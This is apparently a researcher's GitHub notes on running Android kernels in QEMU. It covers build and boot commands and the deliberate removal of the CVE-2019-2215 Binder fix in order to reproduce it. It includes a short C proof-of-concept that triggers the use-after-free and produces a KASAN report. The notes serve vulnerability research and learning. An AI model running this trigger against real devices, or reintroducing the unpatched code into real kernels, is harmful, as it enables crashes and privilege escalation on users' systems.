# Android-kernel-emulation-with-QEMU

We are going to try all the iterations of the android kernel in order to understand the compatibility of emulator.

In that case, we will start working with cloudfuzz‘s android kernel that works on Android10, Pixel2 XL.

repo init --depth=1 -u https://android.googlesource.com/kernel/manifest -b q-goldfish-android-goldfish-4.14-dev

repo sync -c --no-tags --no-clone-bundle -jnproc

On qemu it worked

https://fadeevab.com/build-android-kernel-and-run-on-qemu-minimal-step-by-step/

![image](https://github.com/user-attachments/assets/75181210-9c46-4c90-885d-8573b7dc6c07)

## android13-5.15

Pulling the common android kernel

make defconfig

make kvm_guest.config

wget https://storage.googleapis.com/syzkaller/wheezy.img

qemu-system-x86_64 -m 1G -kernel arch/x86/boot/bzImage -hda wheezy.img -append "root=/dev/sda" -nographic

WORKED

It worked for different branch names too 

![image](https://github.com/user-attachments/assets/759ebcd5-015f-49c3-a43f-9e290e4ba398)

![image](https://github.com/user-attachments/assets/b8b40d78-850a-48ea-b6b7-2fd9451d1bb4)


Without kvm_guest.config it worked.

## ASB

On Ubuntu 18.04.6 LTS

![image](https://github.com/user-attachments/assets/0cca0f09-3e5a-4d6e-964d-a0e0b38e6dd3)

Enabled CONFIG_BINDER_IPC and KASAN manually.
Patched the vulnerability manually which is mentioned here.

https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2019/CVE-2019-2215.html

![image](https://github.com/user-attachments/assets/7af84431-26a5-45af-a996-2289af1c0a6b)

I commented out the green region on the kernel and commented out a few lines for iovec’s usage for exploitation.

![image](https://github.com/user-attachments/assets/d6124dba-9351-4db9-8c5c-788f9a3f927e)


The kernel is ASB-2019-11-05_mainline

Booted up with qemu as i mentioned above

PoC compiled with direct gcc on the VM machine because its x86 kernel is running on the qemu.
```
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define BINDER_THREAD_EXIT 0x40046208ul

int main()
{
        int fd, epfd;
        struct epoll_event event = { .events = EPOLLIN };
                
        fd = open("/dev/binder", O_RDONLY);
        epfd = epoll_create(1000);
        epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event);
        ioctl(fd, BINDER_THREAD_EXIT, NULL);
}
```

I pulled the PoC by wget and SimpleHTTPServer to the machine.

We got the KASAN report when I run the PoC

![image](https://github.com/user-attachments/assets/3ae12257-1f5b-4888-81bc-67ccdc1e9939)


I tried to run CVE-2019-2215 LPE on the qemu and i got it this.

![image](https://github.com/user-attachments/assets/8e550e2b-29b0-4f6a-843e-d739eb45ca15)


Let’s try to make it works.

## Side note:

I couldn’t emulate any android kernel with android configs. I can enable the binder manually, but other environments demand different needs that QEMU cannot supply. For this reason, if you are working on a specific device’s kernel or specific config file you have to have the device or customized QEMU which could be the emulator or the cuttlefish. In that case, we have a few public sources:

https://www.youtube.com/watch?v=kJVy6LRMNyE

https://sites.google.com/junsun.net/how-to-run-cuttlefish/home

